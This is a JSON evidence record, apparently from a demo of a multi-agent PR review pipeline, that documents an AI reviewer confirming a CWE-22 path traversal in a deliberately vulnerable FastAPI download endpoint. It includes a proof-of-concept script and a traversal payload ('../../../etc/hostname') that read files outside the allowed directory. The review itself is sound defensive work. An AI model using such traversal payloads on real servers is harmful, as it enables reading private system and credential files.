@@ -1,0 +1,125 @@
+{
+  "id": "ev-live-review",
+  "title": "Reviewer 结论 pr2-review-1（真实执行）",
+  "level": "REAL_EXECUTED_AGENTTEAMS_LIVE",
+  "fields": [
+    [
+      "结论",
+      "STATUS: SUCCESS · FINDING_CONFIRMED · SEVERITY: HIGH · HUMAN_VERIFICATION_REQUIRED: YES"
+    ],
+    [
+      "定性",
+      "CWE-22 路径穿越/任意文件读取（demo_download L41 os.path.join → L42 FileResponse）"
+    ],
+    [
+      "真实复现",
+      "仓库复现测试 1 passed（越基目录读文件 HTTP 200）；Reviewer 自写 PoC 以 ../../../etc/hostname 读到容器内真实文件"
+    ],
+    [
+      "事件",
+      "委派 $lK5NAkgCQwxnNIoTahtvwFSQW4J_WrNqx5RyM24wNBI"
+    ]
+  ],
+  "blocks": [
+    {
+      "title": "finalsPr2Live/reviewer-result.md",
+      "lang": "text",
+      "text": "STATUS: SUCCESS\nSUMMARY: STATUS: FINDING_CONFIRMED; SEVERITY: HIGH; HUMAN_VERIFICATION_REQUIRED: YES. PR #2 (head 1dedf5e1992c950557064d8f4fb9039d1523deb3, verified via git rev-parse HEAD) adds 2 files / +122/-0: backend/src/interfaces/api/v1/demo_high_risk.py (+42) and backend/tests/unit/test_demo_high_risk_path_traversal.py (+80). Confirmed path traversal: user-controlled 'name' in demo_download is joined to DEMO_FILES_DIR with no normalization/containment (L28 base dir, L41 os.path.join(DEMO_FILES_DIR, name), L42 FileResponse), so '../' sequences escape the base directory and enable arbitrary file read by the process. CWE-22 (path traversal; also CWE-73/CWE-200 exposure). Reproduction command: cd ~/pr2-work && /opt/venv/standard/bin/python -m pytest backend/tests/unit/test_demo_high_risk_path_traversal.py -q -p no:cacheprovider --noconftest -o markers=security_demo. Real pre-fix output: 1 passed (test_high_risk_path_traversal_reproduces -> endpoint returned outside-secret.txt from OUTSIDE the base dir, HTTP 200) and 1 failed (test_high_risk_path_traversal_depth -> RuntimeError File at path .../demo-files/sub/../../../deep-secret.txt does not exist, a fixture/content mismatch, not a mitigation). Independent reviewer PoC (~/pr2-review-repro.py) additionally read an absolute file via traversal: name=../../../etc/hostname -> HTTP 200, content '35d73f559779'. No repository file modified; no fix/patch code; zero GitHub writes.\n\nDELIVERABLES:\n- shared/tasks/pr2-review-1/workspace/findings.md\n"
+    },
+    {
+      "title": "finalsPr2Live/reviewer-pr2-review-repro.py（Reviewer 自写 PoC）",
+      "lang": "python",
+      "text": "\"\"\"Independent Reviewer reproduction — proves path traversal in demo_high_risk.demo_download.\n\nRead-only: imports the module, mounts the real router, issues a crafted request.\nNo repo files are modified.\n\"\"\"\nimport importlib.util\nimport os\nimport sys\nimport tempfile\nfrom pathlib import Path\n\nREPO = Path.home() / \"pr2-work\"\nMOD = REPO / \"backend/src/interfaces/api/v1/demo_high_risk.py\"\n\nspec = importlib.util.spec_from_file_location(\"demo_high_risk\", MOD)\nmod = importlib.util.module_from_spec(spec)\nspec.loader.exec_module(mod)\n\nfrom fastapi import FastAPI\nfrom fastapi.testclient import TestClient\n\n# --- Build a controlled sandbox: base dir + sibling OUTSIDE secret ---\nroot = Path(tempfile.mkdtemp(prefix=\"reviewer-repro-\"))\nbase = root / \"demo_files_base\"\nbase.mkdir()\noutside_secret = root / \"outside-secret.txt\"\noutside_secret.write_text(\"TOP-SECRET-OUTSIDE-BASE\", encoding=\"utf-8\")\n\n# Point the module at our controlled base dir (in-process only)\nmod.DEMO_FILES_DIR = str(base)\n\napp = FastAPI()\napp.include_router(mod.router, prefix=\"/demo-security\")\nclient = TestClient(app)\n\nprint(f\"[i] base dir (allowed)      : {base}\")\nprint(f\"[i] outside secret file     : {outside_secret}\")\nprint(f\"[i] base realpath           : {os.path.realpath(base)}\")\n\nname = \"../outside-secret.txt\"\nr = client.get(\"/demo-security/demo/download\", params={\"name\": name})\nprint(f\"[+] request name            : {name}\")\nprint(f\"[+] HTTP status             : {r.status_code}\")\nprint(f\"[+] response bytes          : {len(r.content)}\")\nprint(f\"[+] response body           : {r.text!r}\")\nescaped = os.path.realpath(os.path.join(mod.DEMO_FILES_DIR, name))\nprint(f\"[+] resolved path on server : {escaped}\")\nprint(f\"[+] escaped base dir?       : {not escaped.startswith(os.path.realpath(base) + os.sep)}\")\nprint(f\"[+] LEAK CONFIRMED          : {'TOP-SECRET-OUTSIDE-BASE' in r.text}\")\n\n# Show it can also read a genuinely arbitrary absolute-ish file via traversal\nabs_target = \"/etc/hostname\"\nrel = os.path.relpath(abs_target, base)\nr2 = client.get(\"/demo-security/demo/download\", params={\"name\": rel})\nprint(f\"[*] arbitrary read attempt  : name={rel} -> status={r2.status_code}, bytes={len(r2.content)}, \"\n      f\"content={r2.text.strip()!r}\")\n"
+    }
+  ],
+  "source_ref": "finalsPr2Live/reviewer-result.md",
+  "hash": {
+    "file": "reviewer-result.md",
+    "dir": "FINALS-ELEM-PR2-LIVE-20260916",
+    "exists": true,
+    "hash_verified": true,
+    "sha256": "2ad940400fc64b07f479b290b07a0b6db5d16f484b578d6c2ff4c08fd6adc93c"
+  },
+  "real": [
+    "本次真实执行（2026-09-16）：真实 Matrix 派单、真实容器内 clone/测试，全部 event_id 可审计；Reviewer 复现与定级独立",
+    "漏洞类别与目标文件由 kickoff 指令点名（非盲测）；人工门为操作员真实批准（修复前）",
+    "Verifier 在独立干净工作区验证，patch sha256 独立复现一致；请求模型 deepseek-chat（网关记录响应 model=deepseek-flash）"
+  ],
+  "controlled": [
+    "本页面为证据的只读回放与讲解文案"
+  ],
+  "not_executed": [
+    "本次演示不连接实时 GitHub / Matrix / LLM",
+    "merge / push / close / reopen 全程禁止，PR #2 保持 OPEN",
+    "GitHub 写入未执行（NOT_EXECUTED）"
+  ],
+  "case": {
+    "case_id": "fastapi-pr2-live-20260916",
+    "case_name": "FastAPI PR #2 · 本次真实运行（2026-09-16）",
+    "repo": "nghqqa/fastapi-boilerplate-demo",
+    "pr": "PR #2 · demo/high-risk-human-gate",
+    "pr_url": "https://github.com/nghqqa/fastapi-boilerplate-demo/pull/2",
+    "run_id": "run-elem-fastapi-pr2-20260916-01",
+    "sha": "1dedf5e1992c950557064d8f4fb9039d1523deb3",
+    "sha_kind": "PR #2 head commit（运行前后 GitHub API 双向核验一致）",
+    "evidence_level": [
+      "REAL_EXECUTED_AGENTTEAMS_LIVE"
+    ],
+    "source_dir": "evidence/FINALS-ELEM-PR2-LIVE-20260916（本次新证据，SHA256SUMS 锁定）",
+    "generated_at": "运行 2026-09-15T17:19Z–2026-09-16T00:5xZ（UTC；墙钟 ≈7.6h，含操作员离席等待，见 AUDIT §2）",
+    "pending_redactions": [
+      [
+        "demo/high-risk-human-gate",
+        "demo/···"
+      ],
+      [
+        "copaw-high-risk-human-gate",
+        "copaw-high-risk-···"
+      ]
+    ]
+  },
+  "integrity": {
+    "finals": {
+      "finalsDbLoop": {
+        "dir": "FINALS-DB-MIGRATION-LOOP-20260914",
+        "tier": "REAL_SQL_VERIFICATION_ISOLATED_POSTGRES",
+        "verified": true,
+        "files": 8,
+        "mismatched": [],
+        "missing": []
+      },
+      "finalsReworkLoop": {
+        "dir": "FINALS-REWORK-LOOP-20260914",
+        "tier": "MECHANISM_VERIFICATION",
+        "verified": true,
+        "files": 7,
+        "mismatched": [],
+        "missing": []
+      },
+      "finalsRagLoop": {
+        "dir": "FINALS-RAG-LOOP-20260914",
+        "tier": "REAL_OFFLINE_EXPERIMENT_SYNTHETIC_CORPUS",
+        "verified": true,
+        "files": 4,
+        "mismatched": [],
+        "missing": []
+      },
+      "finalsPr2Live": {
+        "dir": "FINALS-ELEM-PR2-LIVE-20260916",
+        "tier": "REAL_EXECUTED_AGENTTEAMS_LIVE_20260916",
+        "verified": true,
+        "files": 19,
+        "mismatched": [],
+        "missing": []
+      },
+      "finalsPr3Live": {
+        "dir": "FINALS-ELEM-PR3-LIVE-20260916",
+        "tier": "REAL_EXECUTED_AGENTTEAMS_LIVE_20260916",
+        "verified": true,
+        "files": 8,
+        "mismatched": [],
+        "missing": []
+      }
+    }
+  }
+}
